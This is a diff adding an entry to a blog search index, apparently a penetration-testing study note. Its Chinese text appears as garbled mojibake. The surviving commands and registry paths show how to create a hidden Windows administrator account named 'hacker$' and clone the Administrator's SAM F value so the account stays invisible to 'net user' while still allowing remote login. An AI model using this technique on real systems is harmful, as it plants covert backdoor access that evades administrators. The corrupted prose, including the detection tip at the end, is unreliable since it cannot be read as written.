@@ -2368,4 +2368,63 @@
         <tag>PHP</tag>
       </tags>
   </entry>
+  <entry>
+    <title>intranet03</title>
+    <url>/2021/04/03/intranet03/</url>
+    <content><![CDATA[<h2 id="ʵ�ֹ���"><a href="#ʵ�ֹ���" class="headerlink" title="ʵ�ֹ���"></a>ʵ�ֹ���</h2><ol>
+<li>�½�һ�������û�</li>
+</ol>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user hacker$ P@ssw0rd /add</span><br><span class="line"><span class="built_in">net</span> localgroup administrators hacker$ /add</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403141500963.png" alt="image-20210403141500963"></p>
+<blockquote>
+<p>�û�����<code>$</code>��β��net user���޷���ȡ�������ڿ�����廹�ܿ���</p>
+</blockquote>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403141948213.png" alt="image-20210403141948213"></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403142029285.png" alt="image-20210403142029285"></p>
+<ol start="2">
+<li>�ҵ�ע���·����<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>��<code>hacker$</code></li>
+</ol>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403142229174.png" alt="image-20210403142229174"></p>
+<ol start="3">
+<li>��ʱ������Ա<code>Administrator</code>���Ͷ�Ӧ��Fֵ���Ƶ�<code>hacker$</code>���Ͷ�Ӧ��Fֵ</li>
+</ol>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403142509715.png" alt="image-20210403142509715"></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403142607007.png" alt="image-20210403142607007"></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403142807987.png" alt="image-20210403142807987"></p>
+<ol start="4">
+<li>��hacker$��Ӧ������ֵ������</li>
+</ol>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403143059455.png" alt="image-20210403143059455"></p>
+<ol start="5">
+<li>�����н��û�ɾ��</li>
+</ol>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user hacker$ /<span class="built_in">del</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403143345249.png" alt="image-20210403143345249"></p>
+<ol start="6">
+<li>Ȼ���ٽ���������reg�ϲ�</li>
+</ol>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403143444798.png" alt="image-20210403143444798"></p>
+<ol start="7">
+<li>�ϲ����net user�޷��г����û�����������еı����û�����Ҳ�����ڸ��û�</li>
+</ol>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403145457335.png" alt="image-20210403145457335"></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403145515913.png" alt="image-20210403145515913"></p>
+<ol start="8">
+<li>Զ�̵�½�ɹ�</li>
+</ol>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210403145606553.png" alt="image-20210403145606553"></p>
+<h2 id="С��"><a href="#С��" class="headerlink" title="С��"></a>С��</h2><p>��������û������Բ鿴ע���<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>,��ʱ�򿴲�������Ϊû��Ȩ�ޣ���Ҫ����Ȩ�ޡ������û��ĵ�½��¼����ͨ���鿴��־��ȡ��</p>
+]]></content>
+      <categories>
+        <category>����ѧϰ�ʼ�</category>
+      </categories>
+      <tags>
+        <tag>�����û�</tag>
+        <tag>���</tag>
+        <tag>ѧϰ�ʼ�</tag>
+        <tag>������͸</tag>
+      </tags>
+  </entry>
 </search>
